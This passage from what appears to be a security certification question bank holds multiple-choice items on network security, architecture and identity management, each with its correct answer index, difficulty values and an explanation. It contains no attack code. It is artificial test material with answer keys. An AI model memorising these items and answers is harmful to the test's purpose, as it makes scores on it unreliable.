      "explanation": "Correct Answer: This is a genuine architectural tradeoff. WAF TLS termination enables inspection of decrypted traffic for injection, XSS, and other attacks — but creates a plaintext segment between WAF and app server that could be monitored if the DMZ is compromised. End-to-end TLS maintains confidentiality throughout but prevents WAF from inspecting encrypted payloads. The correct answer depends on threat model; the point is understanding the tradeoff, not a universal preference."
    },
    {
      "id": "d3-q31",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A memory safety vulnerability is discovered in a C application that allows an attacker to overwrite adjacent memory. The developer applies a stack canary and enables ASLR. Which statement MOST accurately characterizes these mitigations?",
      "choices": [
        "Stack canaries detect stack buffer overflows before the return address is used; ASLR randomizes memory layout to make exploitation harder — both are mitigations that increase attack difficulty without eliminating the vulnerability",
        "Stack canaries and ASLR together eliminate all memory corruption vulnerabilities in C programs",
        "The correct fix is to rewrite the application in a memory-safe language; mitigations are insufficient",
        "ASLR is the only effective mitigation; stack canaries are obsolete since they can be bypassed"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Stack canaries and ASLR are defense-in-depth mitigations that raise the cost of exploitation — they don't eliminate the underlying vulnerability. Canaries detect overwrites before control transfer; ASLR makes address prediction harder. They can both be bypassed under certain conditions. Rewriting in a memory-safe language is ideal for new code but not always feasible for legacy systems — and mitigations are valuable while that work proceeds."
    },
    {
      "id": "d3-q32",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security review finds that an organization's microservices architecture has each service calling every other service directly with no authentication between them. An attacker who compromises one service can reach all others. Which architectural pattern MOST directly addresses this?",
      "choices": [
        "Encrypt the network link between all services using IPsec tunnel mode",
        "Place all microservices behind a single external API gateway that handles all authentication",
        "Implement a WAF in front of each microservice to inspect inter-service traffic",
        "Service mesh with mutual TLS (mTLS) between all services, enforcing authentication and authorization at the service-to-service layer"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: A service mesh with mTLS enforces mutual authentication between every service pair — each service must prove identity before communicating. This prevents a compromised service from freely reaching others. An API gateway handles external traffic but not internal east-west traffic between services. IPsec encrypts transport but doesn't authenticate service identity at the application layer. WAFs are designed for north-south web traffic, not microservice-to-microservice API calls."
    },
    {
      "id": "d4-q17",
      "domain": "4 Communication and Network Security",
      "stem": "A SOC analyst observes a flood of TCP SYN packets from thousands of spoofed source IPs targeting a public web server, exhausting its connection table. Which mitigation MOST directly addresses this SYN flood attack?",
      "choices": [
        "Deploy an IDS rule to alert when more than 100 SYN packets arrive per second",
        "Block all inbound TCP traffic at the perimeter firewall",
        "Enable SYN cookies on the server or upstream load balancer — this allows the server to handle connections without allocating state until the handshake completes",
        "Increase the server's TCP connection table size"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: SYN cookies allow a server to respond to SYN packets without committing memory until the three-way handshake completes — if the client never completes the handshake (as in a spoofed SYN flood), no connection state is consumed. Blocking all TCP traffic defeats the purpose of a public web server. Increasing the table size only delays exhaustion. An IDS alert detects but doesn't prevent the exhaustion."
    },
    {
      "id": "d4-q18",
      "domain": "4 Communication and Network Security",
      "stem": "An enterprise network uses VLANs to segment guest Wi-Fi from the corporate network. A penetration tester demonstrates VLAN hopping using a double-tagging attack via an access port. Which configuration change MOST directly closes this vulnerability?",
      "choices": [
        "Implement 802.1X on all access ports to authenticate devices before allowing connectivity",
        "Encrypt all VLAN traffic using IPsec to prevent content interception after hopping",
        "Increase the number of VLANs to spread traffic and reduce collision domain size",
        "Ensure the native VLAN on trunk ports is set to an unused VLAN ID not assigned to any hosts, and disable DTP (Dynamic Trunking Protocol) on all access ports"
      ],
      "correctIndex": 3,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: VLAN double-tagging exploits the native VLAN behavior on trunk ports and DTP auto-negotiation. Setting the native VLAN to an unused ID prevents double-tagged frames from being delivered, and disabling DTP prevents access ports from being negotiated into trunk mode. More VLANs don't address the native VLAN exploit. 802.1X authenticates the device but doesn't prevent double-tagging if the port is misconfigured. IPsec prevents data theft after hopping, not the hop itself."
    },
    {
      "id": "d4-q19",
      "domain": "4 Communication and Network Security",
      "stem": "A network engineer configures an IPsec VPN between two sites. Management requires that both data origin authentication and confidentiality be provided. Which IPsec header configuration BEST meets both requirements?",
      "choices": [
        "ESP (Encapsulating Security Payload) in tunnel mode — it provides both encryption (confidentiality) and integrity/authentication",
        "ESP transport mode with a separate AH header for authentication",
        "AH (Authentication Header) in tunnel mode — it provides both authentication and encryption",
        "AH for authentication and a separate GRE tunnel for confidentiality"
      ],
      "correctIndex": 0,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: ESP provides both confidentiality (encryption) and data origin authentication/integrity. In tunnel mode, it also protects the original IP header. AH provides authentication and integrity but NOT confidentiality — it cannot encrypt. GRE is an encapsulation protocol, not a security protocol. Using both ESP and AH together is possible but redundant for this use case; ESP tunnel mode satisfies both requirements on its own."
    },
    {
      "id": "d4-q20",
      "domain": "4 Communication and Network Security",
      "stem": "DNSSEC is enabled on a corporate domain. A security analyst explains to management what DNSSEC provides and what it does NOT provide. Which description is MOST accurate?",
      "choices": [
        "DNSSEC replaces the need for HTTPS by ensuring users reach the authentic server",
        "DNSSEC provides cryptographic validation that DNS responses are authentic and unmodified; it does not encrypt DNS queries or prevent a DNS server from being queried",
        "DNSSEC prevents DNS cache poisoning and also prevents DNS amplification attacks",
        "DNSSEC encrypts DNS traffic end-to-end between client and server, preventing eavesdropping"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: DNSSEC uses digital signatures to authenticate that DNS responses are from the legitimate zone authority and haven't been tampered with. It does NOT encrypt query content — DNS over HTTPS (DoH) or DNS over TLS (DoT) are needed for confidentiality. DNSSEC doesn't prevent DDoS amplification attacks (those require response rate limiting). DNSSEC and HTTPS serve different security purposes — DNSSEC validates DNS integrity, HTTPS encrypts the application layer."
    },
    {
      "id": "d4-q21",
      "domain": "4 Communication and Network Security",
      "stem": "A large enterprise is deploying 802.1X port-based network access control. During a pilot, devices without 802.1X supplicants are denied network access, blocking critical legacy printers and building management systems. What is the MOST appropriate resolution?",
      "choices": [
        "Exempt all printers and building systems from 802.1X permanently because they cannot be upgraded",
        "Disable 802.1X for the network segments containing legacy devices",
        "Implement MAC Authentication Bypass (MAB) for non-802.1X-capable devices with strict network ACLs limiting their access to required resources only",
        "Replace all legacy devices immediately before deploying 802.1X"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: MAB allows devices without 802.1X capability to authenticate via MAC address — a weaker mechanism but better than exemption. Pairing MAB with restrictive ACLs limits what these devices can access, maintaining network segmentation. Permanent blanket exemption removes the devices from the access control framework entirely. Disabling 802.1X for whole segments eliminates the control. Immediate replacement is cost-prohibitive and operationally disruptive."
    },
    {
      "id": "d4-q22",
      "domain": "4 Communication and Network Security",
      "stem": "A threat intelligence report warns that BGP route hijacking has been used to intercept traffic to a major bank's IP prefixes. Which control MOST directly mitigates BGP hijacking against the bank's prefix?",
      "choices": [
        "Deploying DDoS scrubbing centers at all peering points",
        "Implementing private BGP communities to hide routing information from internet peers",
        "Switching from eBGP to OSPF for inter-AS routing",
        "RPKI (Resource Public Key Infrastructure) route origin validation — cryptographically ties IP prefixes to authorized ASNs, allowing routers to reject unauthorized route announcements"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.2,
      "explanation": "Correct Answer: RPKI allows prefix holders to cryptographically sign Route Origin Authorizations (ROAs) asserting which ASN is authorized to originate their prefixes. Routers with RPKI validation can reject invalid route announcements. Private BGP communities obscure information but don't prevent prefix hijacking. DDoS scrubbing protects against volumetric attacks, not routing attacks. OSPF is an interior routing protocol and cannot replace eBGP for internet routing."
    },
    {
      "id": "d4-q23",
      "domain": "4 Communication and Network Security",
      "stem": "A security architect is selecting a TLS version policy for a new customer-facing API. The team debates between requiring TLS 1.2 minimum vs. TLS 1.3 only. A developer argues TLS 1.2 is acceptable because it's widely supported. What is the STRONGEST security argument for requiring TLS 1.3?",
      "choices": [
        "TLS 1.2 is vulnerable to BEAST and POODLE attacks when used with RC4 or CBC cipher suites and no mitigations exist",
        "TLS 1.3 removes deprecated cipher suites, mandates perfect forward secrecy for all sessions, eliminates the RSA key exchange, and reduces handshake round trips — it is more secure by design",
        "TLS 1.3 is FIPS 140-2 certified while TLS 1.2 is not, making TLS 1.2 non-compliant",
        "TLS 1.3 is faster, so performance is the primary reason to prefer it over TLS 1.2"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: TLS 1.3 redesigned the handshake to remove weak cipher suites (RSA key exchange, CBC modes), mandate ephemeral key exchange (PFS for every session), and simplify the protocol to reduce attack surface. TLS 1.2 with modern cipher suites and mitigations is not inherently broken, but TLS 1.3 is architecturally stronger. FIPS 140-2 certification applies to cryptographic modules, not TLS versions. BEAST/POODLE affect older TLS 1.0/SSL configurations, not well-configured TLS 1.2. Performance improvement is real but secondary."
    },
    {
      "id": "d4-q24",
      "domain": "4 Communication and Network Security",
      "stem": "An organization uses WPA2-Enterprise with 802.1X for its corporate Wi-Fi. A red team discovers that clients connect to a rogue AP broadcasting the corporate SSID because certificates are not validated. What configuration change MOST directly prevents this attack?",
      "choices": [
        "Implement WPA3-SAE instead of WPA2-Enterprise, which prevents rogue APs entirely",
        "Deploy a wireless IDS to detect rogue APs and alert the SOC",
        "Change the SSID to a non-guessable name to prevent the rogue AP from knowing what to broadcast",
        "Configure Wi-Fi clients to validate the RADIUS server certificate against the corporate CA — clients should reject connections to any AP presenting an untrusted or different certificate"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.15,
      "explanation": "Correct Answer: In WPA2-Enterprise, the client should validate the RADIUS/EAP server certificate. Without validation, a rogue AP can present any certificate and complete the EAP exchange, capturing credentials. Client-side certificate validation pins the RADIUS server identity. SSID obscurity doesn't prevent rogue APs — attackers monitor the air. WPA3-SAE improves personal mode security but doesn't inherently prevent rogue AP EAP attacks. Wireless IDS is detective, not preventive."
    },
    {
      "id": "d4-q25",
      "domain": "4 Communication and Network Security",
      "stem": "A network segmentation review finds that the development environment can reach production systems via internal routing. A breach of a development machine leads to lateral movement into production. Which principle was MOST violated in this architecture?",
      "choices": [
        "Encryption — production traffic should be encrypted to prevent interception",
        "Patch management — development systems must be patched as frequently as production",
        "Least privilege and network separation — development and production environments should be in separate network segments with no default routing between them",
        "Logging — insufficient logging prevented detection of the lateral movement"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Development-to-production connectivity violates both least privilege (dev systems have no business need to reach prod) and network separation (environments should be segregated so a dev compromise cannot directly pivot to production). Encryption protects data in transit but not from lateral movement by an authenticated attacker. Patching is important but the architectural gap is the open routing. Logging is important but doesn't address the root architectural issue."
    },
    {
      "id": "d4-q26",
      "domain": "4 Communication and Network Security",
      "stem": "A security analyst receives an alert that an internal host is making DNS requests for a domain with a very high entropy, random-looking subdomain that changes every few seconds. What attack technique does this MOST likely indicate?",
      "choices": [
        "DNS amplification DDoS — the host is being used to send spoofed DNS queries to open resolvers",
        "DNS cache poisoning — the attacker is overwriting legitimate DNS entries with malicious ones",
        "DNS tunneling or C2 beaconing — attackers encode data in DNS queries using high-entropy subdomains to exfiltrate data or maintain command-and-control over an infected host",
        "BGP prefix hijacking — the attacker is advertising false routes through DNS"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: High-entropy, rapidly changing subdomains are a hallmark of DNS tunneling (data exfiltration over DNS) or domain generation algorithms (DGA) used by malware for C2 communication. DNS queries for random subdomains often bypass content filters. DNS cache poisoning involves injecting false responses. DNS amplification uses open resolvers with spoofed source IPs. BGP hijacking operates at the routing layer, not DNS query patterns."
    },
    {
      "id": "d4-q27",
      "domain": "4 Communication and Network Security",
      "stem": "A network firewall ACL is processed top-to-bottom (first-match). An administrator adds a rule at the bottom to deny a specific IP but notices the traffic is still being allowed. What is the MOST likely cause?",
      "choices": [
        "The rule syntax is correct but the firewall requires a reboot to apply new ACL entries",
        "A broader 'permit' rule higher in the ACL is matching the traffic before the deny rule is reached",
        "Deny rules must be placed in a separate ACL from permit rules",
        "The firewall is stateful and cached the connection before the rule was added"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: First-match ACL processing means rules are evaluated in order — a broader permit rule earlier in the list matches the traffic before the specific deny rule at the bottom is reached. The fix is to place specific rules before general ones. Stateful connection tables affect established sessions but not initial connection decisions on most next-gen firewalls when a new explicit deny is added. Deny and permit rules coexist in the same ACL. Modern firewalls apply ACL changes without rebooting."
    },
    {
      "id": "d4-q28",
      "domain": "4 Communication and Network Security",
      "stem": "An organization wants to implement microsegmentation in its data center using software-defined networking. The security team argues this is more effective than traditional VLAN-based segmentation for lateral movement prevention. What is the STRONGEST technical justification?",
      "choices": [
        "Microsegmentation eliminates the need for encryption because all traffic is monitored",
        "VLAN segmentation requires physical network changes; microsegmentation does not require any configuration",
        "Microsegmentation enforces policies at the workload level (per-VM or per-container), regardless of network location, while VLAN segmentation only controls traffic between network segments — workloads in the same VLAN can communicate freely",
        "Microsegmentation is faster because it uses software rather than hardware switching"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: VLANs segment at the network boundary — workloads within the same VLAN can communicate freely, enabling lateral movement between compromised and target systems in the same segment. Microsegmentation applies policies per-workload, so even within the same VLAN, east-west traffic is controlled. This directly limits lateral movement. Performance difference is irrelevant to the security argument. Microsegmentation requires significant policy configuration. Monitoring is not equivalent to encryption."
    },
    {
      "id": "d4-q29",
      "domain": "4 Communication and Network Security",
      "stem": "A cloud security engineer notices that an internal application is using SNMPv1 for network device management. A security review flags this as high risk. What are the TWO MOST critical reasons to replace SNMPv1?",
      "choices": [
        "SNMPv1 is deprecated and no longer supported by modern operating systems, so it must be replaced for operational reasons",
        "SNMPv1 cannot monitor IPv6 devices, which limits coverage in dual-stack environments",
        "SNMPv1 creates excessive network traffic and degrades management plane performance",
        "SNMPv1 uses community strings (plaintext passwords) and has no authentication — credentials can be captured and devices can be queried or reconfigured by any attacker who intercepts the traffic"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: SNMPv1 (and v2c) transmit community strings — which serve as passwords — in plaintext, making them trivially capturable. It also lacks message authentication, allowing any device on the network to issue management queries or WRITE commands to network devices. SNMPv3 provides authentication and encryption. OS support is an operational concern, not the primary security issue. SNMP traffic volume is a network design concern, not a security issue. IPv6 support is a functionality, not security limitation."
    },
    {
      "id": "d4-q30",
      "domain": "4 Communication and Network Security",
      "stem": "During a network architecture review, a consultant recommends replacing the traditional hub-and-spoke VPN with a ZTNA (Zero Trust Network Access) solution for remote workers. Management asks what specific security improvement ZTNA provides over VPN.",
      "choices": [
        "ZTNA eliminates the need for MFA because its trust model is stronger than traditional authentication",
        "ZTNA grants access to specific applications based on identity and device posture rather than placing users on the full corporate network — it limits exposure if a remote device is compromised",
        "ZTNA is equivalent to VPN but with better logging; the primary benefit is audit trail improvement",
        "ZTNA provides faster connection speeds than VPN, making it both a security and productivity improvement"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Traditional VPN places users on the corporate network — a compromised VPN device has broad internal network access. ZTNA grants per-application access based on verified identity and device health, without placing the user on the broader network. This limits blast radius of a device compromise. Speed improvement is a secondary benefit, not the security justification. ZTNA relies heavily on strong identity verification including MFA. ZTNA provides comprehensive access control, not just logging."
    },
    {
      "id": "d4-q31",
      "domain": "4 Communication and Network Security",
      "stem": "An organization is deploying a new application using VXLAN for network virtualization across data centers. The security team raises concerns about the VXLAN implementation. Which is the MOST valid security concern specific to VXLAN?",
      "choices": [
        "VXLAN increases network latency beyond acceptable thresholds for security monitoring",
        "VXLAN encapsulates Layer 2 frames in UDP without native encryption or authentication — an attacker on the underlay network can inject or intercept VXLAN traffic unless additional encryption (e.g., IPsec) is applied to the underlay",
        "VXLAN requires all physical switches to be replaced with VXLAN-capable hardware before deployment",
        "VXLAN cannot support 802.1X authentication, making endpoint security impossible"
      ],
      "correctIndex": 1,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: VXLAN (RFC 7348) encapsulates Layer 2 traffic in UDP/IP but has no built-in encryption or authentication. An attacker with access to the underlay network can potentially inject malicious VXLAN frames or capture encapsulated traffic. The recommendation is to encrypt the underlay (IPsec or MACsec) or use VXLAN with integrated encryption (e.g., NSX-T encryption). Latency concern is not a security issue. VXLAN is a network virtualization protocol and 802.1X applies at the edge, not VXLAN level. VXLAN can be implemented in software."
    },
    {
      "id": "d4-q32",
      "domain": "4 Communication and Network Security",
      "stem": "A network forensics team is reconstructing a security incident. They have captured full packet data but need to prioritize which layers to examine first. Following the principle of network forensic analysis, what should they examine FIRST?",
      "choices": [
        "Layer 3 and 4 headers (IP addresses, ports, protocols, flags) to establish the conversation map before drilling into Layer 7 application payloads",
        "Layer 7 application data, because the actual attack payload is always at the application layer",
        "Layer 1 and 2 physical and link-layer data, because attacks always originate at the physical layer",
        "DNS logs first, because all attacks involve domain lookups"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Network forensics follows the 'outer to inner' approach — establish who communicated with whom (L3/L4: IPs, ports, timing, flags) to build the conversation timeline before examining content. This scopes the investigation and identifies relevant flows. Application layer payloads matter, but examining them without first mapping the conversation wastes time. L1/L2 data is relevant for proximity-based attacks but not the primary starting point for network intrusion analysis. DNS logs are valuable but are part of the broader conversation mapping step."
    },
    {
      "id": "d5-q17",
      "domain": "5 Identity and Access Management",
      "stem": "An enterprise is federating identity between its cloud identity tenant and a partner organization's identity provider using SAML 2.0. The partner's users need to access the enterprise's internal HR portal. In this arrangement, which entity issues the SAML assertion?",
      "choices": [
        "The HR portal acting as both IdP and SP in a self-asserted model",
        "The partner's identity provider (IdP) — it authenticates partner users and issues assertions to the enterprise's Service Provider (SP)",
        "The enterprise's cloud identity service acting as Identity Provider — it authenticates partner users via proxy",
        "A neutral third-party CA that signs all SAML assertions on behalf of both organizations"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: In SAML 2.0, the Identity Provider (IdP) authenticates users and issues signed assertions. The Service Provider (SP) trusts the IdP's assertion and grants access. Here, the partner's identity provider is the IdP (it knows the partner's users); the enterprise HR portal (via the enterprise's cloud identity service acting as SP) accepts the assertion. The enterprise's cloud identity service doesn't directly authenticate partner users in this federation model. Applications are SPs, not IdPs. SAML doesn't use a neutral CA to issue assertions."
    },
    {
      "id": "d5-q18",
      "domain": "5 Identity and Access Management",
      "stem": "A developer is designing a mobile app that allows users to log in with their Google account to access the app's features. The app should NOT receive the user's Google password. Which protocol is MOST appropriate, and what does it grant?",
      "choices": [
        "Kerberos — it issues service tickets that the mobile app uses to authenticate",
        "SAML 2.0 — it provides both authentication and authorization for mobile applications",
        "LDAP — the app queries Google's directory to validate credentials",
        "OAuth 2.0 with OpenID Connect — OAuth 2.0 handles delegated authorization (access tokens) and OIDC adds identity (ID tokens with user claims) without sharing the password"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: OAuth 2.0 is designed for delegated authorization — apps receive access tokens without passwords. OpenID Connect (OIDC) adds an identity layer on top of OAuth 2.0, providing ID tokens with user identity claims. Together they handle the 'sign in with Google' pattern perfectly. SAML 2.0 is XML-based and designed for enterprise browser-based SSO, not mobile apps. LDAP requires credential validation, not token-based delegation. Kerberos is an enterprise ticket-granting system, not an internet-scale SSO protocol."
    },
    {
      "id": "d5-q19",
      "domain": "5 Identity and Access Management",
      "stem": "A security architect is designing MFA for an executive team with high-value targets. The threat model includes SIM-swapping attacks. Which MFA method MOST effectively resists SIM-swapping?",
      "choices": [
        "TOTP authenticator apps — they use time-based codes independent of the phone number",
        "Email-based OTP — it avoids phone numbers entirely and is resistant to SIM swap",
        "FIDO2 hardware security keys — they use public-key cryptography tied to the physical device, making SIM-swapping irrelevant since no phone number is involved",
        "SMS OTP — it is the most widely supported and convenient MFA method"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: FIDO2 hardware security keys use asymmetric cryptography where the private key never leaves the physical device. They have no phone number dependency — SIM-swapping cannot intercept them. SMS OTP is directly vulnerable to SIM-swapping (attacker hijacks your number and receives OTPs). Email OTP can be compromised via account takeover, not SIM-swapping directly, but is weaker overall. TOTP apps on smartphones can be bypassed if the attacker uses the SIM swap to recover the account and adds their own authenticator."
    },
    {
      "id": "d5-q20",
      "domain": "5 Identity and Access Management",
      "stem": "A PAM (Privileged Access Management) system is deployed to manage standing privileged accounts for 50 system administrators. The security team proposes eliminating standing privilege entirely and replacing it with just-in-time (JIT) access. What is the PRIMARY security benefit of JIT over standing privilege?",
      "choices": [
        "JIT is faster than standing privilege because it doesn't require login each time",
        "JIT minimizes the window of privilege — credentials only exist for the duration of the approved task, reducing exposure from credential theft, insider misuse, and lateral movement",
        "JIT eliminates the need for multi-factor authentication on privileged accounts",
        "JIT is required by PCI DSS for all environments with more than 10 administrators"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Standing privilege means credentials exist continuously — theft or misuse can occur at any time. JIT provisions access only when needed, for a defined period, for a specific task. This shrinks the attack window dramatically: stolen JIT credentials expire quickly, and persistent privileged sessions aren't available to attackers. JIT adds authentication overhead, not reduces it. JIT systems typically require stronger authentication, not less. PCI DSS has privileged access requirements but doesn't mandate JIT specifically."
    },
    {
      "id": "d5-q21",
      "domain": "5 Identity and Access Management",
      "stem": "An IAM architect at a global bank is investigating a Kerberos golden ticket attack. Security confirms the KRBTGT account password was compromised and the attacker generated valid TGTs for any account in the domain. What is the FIRST remediation step after containing the breach?",
      "choices": [
        "Reset the KRBTGT account password twice — the first reset forces new ticket issuance, and the second invalidates all tickets created with the first compromised key",
        "Reset all domain user passwords immediately and force re-authentication",
        "Revoke all active TGTs by restarting the KDC service on the domain controller",
        "Disable Kerberos and switch to NTLM for authentication"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: The KRBTGT password is used to encrypt all TGTs. Resetting it twice (with a short interval) invalidates all existing golden tickets — the first reset changes the current key, the second removes the previous key from the KDC's rolling history that it accepts. Just resetting user passwords doesn't invalidate attacker-held golden tickets. Switching to NTLM is a regression in security and operationally disruptive. Restarting KDC doesn't change the KRBTGT key and won't invalidate attacker-forged tickets."
    },
    {
      "id": "d5-q22",
      "domain": "5 Identity and Access Management",
      "stem": "An organization uses ABAC (Attribute-Based Access Control) for a content management system. A policy states: 'Allow access if user.department = Finance AND document.sensitivity = Internal AND time_of_day = business_hours.' A Finance employee tries to access a document classified as Internal at 11 PM and is denied. The employee claims it should be allowed. Who is correct?",
      "choices": [
        "The result is indeterminate — ABAC cannot evaluate time-based policies at runtime",
        "The system is wrong — department and sensitivity matching should always override time restrictions",
        "The system is correct — all three policy conditions must be true simultaneously; the time condition is not met, so access is correctly denied",
        "The employee is correct — ABAC policies use OR logic by default, so matching any two conditions is sufficient"
      ],
      "correctIndex": 2,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: ABAC policies with AND conditions require ALL conditions to be true. The time condition (business_hours) is not met at 11 PM, so the policy evaluates to deny — correctly. ABAC doesn't use OR logic by default; policy logic is explicitly defined. Time-based restrictions are legitimate ABAC policy components and override other matching attributes when defined with AND. ABAC policy engines are specifically designed to evaluate time-based attributes at runtime."
    },
    {
      "id": "d5-q23",
      "domain": "5 Identity and Access Management",
      "stem": "During an identity review, an IAM analyst finds 200 user accounts that are active in the enterprise directory service but haven't logged in for over 90 days. Many belong to former contractors. What is the MOST appropriate immediate action?",
      "choices": [
        "Require the affected users to reset their passwords within 30 days",
        "Delete all 200 accounts immediately to eliminate the attack surface",
        "Transfer ownership of the accounts to their last-known managers for review",
        "Disable the accounts pending formal confirmation that they are no longer needed, then remove them after a defined grace period"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Disabling accounts (not deleting) preserves audit trails while eliminating access risk. A grace period allows business owners to reclaim accounts if a mistake is made. Immediate deletion loses audit history and may break dependencies. Password resets don't address dormant account risk — an attacker using a dormant account still has access. Transferring to managers is a reasonable secondary step, but the immediate security action is to disable access."
    },
    {
      "id": "d5-q24",
      "domain": "5 Identity and Access Management",
      "stem": "An organization deploys biometric fingerprint scanners at high-security server room doors. The security team debates the FAR and FRR settings. The facility houses classified data, and the security team prioritizes preventing unauthorized entry above all else. Which biometric configuration BEST matches this requirement?",
      "choices": [
        "Lower FRR (False Reject Rate) even if it increases FAR — authorized users shouldn't be inconvenienced",
        "Lower FAR (False Accept Rate) even if it increases FRR — the priority is preventing unauthorized access, so false accepts must be minimized even if some authorized users are occasionally rejected",
        "Use the crossover error rate (CER) setting, which always provides the best security for classified environments",
        "Set both FAR and FRR to zero — modern biometrics can achieve this with proper calibration"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: FAR measures how often unauthorized users are incorrectly admitted. For high-security classified environments, minimizing FAR (false accepts) is the priority — the cost of unauthorized entry is catastrophic. This comes at the cost of higher FRR (more inconvenience for authorized users). FAR and FRR trade off against each other; neither can be zero simultaneously. CER is where FAR=FRR — it's a baseline metric, not an optimal security setting."
    },
    {
      "id": "d5-q25",
      "domain": "5 Identity and Access Management",
      "stem": "An enterprise's identity governance program shows that 35% of user roles were created as one-off exceptions rather than through the role engineering process. Role explosion is causing access review fatigue. What is the MOST effective corrective measure?",
      "choices": [
        "Increase the access review frequency to quarterly to catch violations sooner",
        "Convert all roles to ABAC to eliminate the role management problem entirely",
        "Conduct role mining on current access data to identify natural permission clusters, consolidate exception roles into standard roles, and enforce role engineering governance for future requests",
        "Delete all exception roles immediately and require users to request access from scratch"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Role mining analyzes actual access patterns to derive rational role definitions. Consolidating exception roles into engineered roles reduces the role count and makes access reviews manageable. This is the standard remediation for role explosion. Deleting roles immediately removes access for users who need it. Quarterly reviews address frequency but not the underlying role complexity. Converting to pure ABAC doesn't automatically simplify governance and creates implementation complexity."
    },
    {
      "id": "d5-q26",
      "domain": "5 Identity and Access Management",
      "stem": "A user reports that their session was hijacked after visiting a website that appeared legitimate. Investigation reveals the attacker used a session fixation technique. Which preventive control MOST directly addresses session fixation?",
      "choices": [
        "Require re-authentication every 30 minutes during active sessions",
        "Encrypt all session tokens using AES-256",
        "Issue a new session token upon successful authentication and invalidate any pre-authentication token — session fixation requires the attacker's pre-set token to remain valid after login",
        "Implement HTTPS to prevent session token interception"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Session fixation works by tricking the server into accepting a session token that the attacker already knows. The defense is to regenerate the session token at login — if the application issues a completely new, unpredictable session ID upon authentication, any pre-set token the attacker planted becomes invalid. Encryption protects token confidentiality but not fixation. HTTPS prevents interception (session hijacking via eavesdropping), not fixation. Re-authentication reduces session duration but doesn't prevent the attack."
    },
    {
      "id": "d5-q27",
      "domain": "5 Identity and Access Management",
      "stem": "A company's joiner-mover-leaver process works well for employee accounts but consistently misses contractor access termination. Contractors use a different onboarding system. What is the MOST effective long-term fix?",
      "choices": [
        "Require managers to manually submit termination requests for contractors within 24 hours",
        "Limit contractors to time-limited accounts that expire automatically after 90 days and require renewal",
        "Create a separate quarterly audit specifically for contractor accounts",
        "Integrate contractor system events (start/end dates) into the IAM provisioning workflow so contractor account lifecycle is automated on the same triggers as employee accounts"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The root cause is that contractor events (contract end) aren't flowing into the IAM system. Integrating contractor system data into the IAM workflow automates the lifecycle and eliminates the gap. Manual processes rely on human action and fail frequently. Quarterly audits are a detective compensating control, not a preventive fix. Time-limited accounts partially address the issue but require active renewal tracking and don't handle early terminations."
    },
    {
      "id": "d5-q28",
      "domain": "5 Identity and Access Management",
      "stem": "During a penetration test, the red team demonstrates that a web application's password reset flow sends reset tokens via email without expiry. An attacker with access to old emails can reset any account. What is the MOST direct remediation?",
      "choices": [
        "Implement short-lived reset tokens (15-30 minutes) that expire after first use and bind the token to the originating IP and user agent",
        "Require users to enter their current password before requesting a reset",
        "Increase password complexity requirements to reduce the impact of account takeover",
        "Send reset tokens via SMS instead of email to improve security"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Non-expiring tokens are the specific vulnerability — the fix is time-limited tokens that expire quickly and become invalid after single use. Binding to originating IP/user agent adds additional binding. Requiring the current password defeats the purpose of a reset flow. SMS OTP has its own vulnerabilities (SIM-swapping) and doesn't address the root cause. Password complexity doesn't prevent account takeover via reset token replay."
    },
    {
      "id": "d5-q29",
      "domain": "5 Identity and Access Management",
      "stem": "A company implements SCIM (System for Cross-domain Identity Management) between its HR system and cloud applications. During a test, a user terminated in the HR system still has active accounts in three cloud apps 48 hours later. What is the MOST likely cause?",
      "choices": [
